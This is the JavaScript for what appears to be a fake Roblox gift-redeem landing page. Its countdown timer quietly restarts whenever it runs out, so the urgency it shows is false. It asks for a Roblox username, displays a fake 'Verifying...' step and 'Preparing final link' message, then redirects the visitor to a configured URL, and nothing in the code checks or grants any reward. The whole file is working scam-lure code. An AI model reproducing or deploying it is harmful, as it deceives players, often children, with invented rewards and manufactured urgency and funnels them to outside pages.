(function () {
  var openButton = document.getElementById("open-claim");
  var closeButton = document.getElementById("close-claim");
  var form = document.getElementById("claim-form");
  var username = document.getElementById("username");
  var statusSpan = document.getElementById("claim-status");
  var finalButton = form.querySelector(".final-button");
  var countdownEls = {
    days: document.getElementById("days"),
    hours: document.getElementById("hours"),
    minutes: document.getElementById("minutes"),
    seconds: document.getElementById("seconds")
  };

  // Initial countdown duration: 5 days, 19 hours, 3 minutes, 19 seconds
  var INITIAL_SECONDS = (5 * 86400) + (19 * 3600) + (3 * 60) + 19;

  function getTargetTimestamp() {
    var stored = localStorage.getItem("countdownTarget");
    if (stored) {
      var target = parseInt(stored, 10);
      if (!isNaN(target) && target > Date.now()) {
        return target;
      }
    }
    return Date.now() + (INITIAL_SECONDS * 1000);
  }

  function saveTargetTimestamp(timestamp) {
    localStorage.setItem("countdownTarget", timestamp);
  }

  function updateCountdown() {
    var now = Date.now();
    var target = getTargetTimestamp();
    var remainingMs = target - now;

    if (remainingMs <= 0) {
      var newTarget = now + (INITIAL_SECONDS * 1000);
      saveTargetTimestamp(newTarget);
      target = newTarget;
      remainingMs = INITIAL_SECONDS * 1000;
    }

    var remainingSeconds = Math.floor(remainingMs / 1000);
    var days = Math.floor(remainingSeconds / 86400);
    var hours = Math.floor((remainingSeconds % 86400) / 3600);
    var minutes = Math.floor((remainingSeconds % 3600) / 60);
    var seconds = remainingSeconds % 60;

    countdownEls.days.textContent = String(days);
    countdownEls.hours.textContent = String(hours);
    countdownEls.minutes.textContent = String(minutes);
    countdownEls.seconds.textContent = String(seconds).padStart(2, "0");
  }

  function initCountdown() {
    var target = getTargetTimestamp();
    saveTargetTimestamp(target);
    updateCountdown();
    setInterval(updateCountdown, 1000);
  }

  function openModal() {
    form.hidden = false;
    statusSpan.textContent = "";
    username.value = ""; // Clear previous input
    finalButton.disabled = false;
    finalButton.textContent = "Claim reward";
    setTimeout(function () {
      username.focus();
    }, 50);
  }

  function closeModal() {
    form.hidden = true;
  }

  function goRedirect() {
    if (window.LandingRedirect && typeof window.LandingRedirect.go === "function") {
      window.LandingRedirect.go("roblox gift redeem");
      return;
    }
    var cfg = window.LANDING_CONFIG || {};
    var url = String(cfg.redirectUrl || "https://example.com").trim();
    if (cfg.openInNewTab) {
      window.open(url, "_blank", "noopener,noreferrer");
    } else {
      window.location.href = url;
    }
  }

  openButton.addEventListener("click", openModal);
  closeButton.addEventListener("click", closeModal);

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    
    var rawValue = username.value;
    var trimmedValue = rawValue.trim().replace(/^@+/, "");
    
    // Check if empty or too short
    if (trimmedValue === "") {
      statusSpan.textContent = "Please enter your Roblox username.";
      username.focus();
      return;
    }
    
    if (trimmedValue.length < 3) {
      statusSpan.textContent = "Username must be at least 3 characters.";
      username.focus();
      return;
    }
    
    // Valid username - proceed
    username.value = trimmedValue;
    finalButton.disabled = true;
    finalButton.textContent = "Verifying...";
    statusSpan.textContent = "Preparing final link for " + trimmedValue + ".";
    setTimeout(goRedirect, 700);
  });

  initCountdown();
})();
